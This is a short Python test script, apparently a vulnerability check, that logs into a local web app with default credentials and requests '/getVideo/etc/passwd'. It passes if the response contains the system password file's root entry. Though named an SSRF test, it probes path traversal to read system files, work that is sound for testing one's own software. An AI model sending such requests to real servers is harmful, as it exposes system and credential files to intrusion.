import sys, requests, pytest

def testSSRF():
    s = requests.Session()
    r = s.post("https://localhost/login", data={"username":"test", "password":"password"}, verify=False)
    t = s.get("https://localhost/getVideo/etc/passwd", verify=False)
    s.close()

    if b"root:x:0:0:root:/root:/bin/bash" in t.content:
        return True
    return False

def main():
    assert testSSRF() == True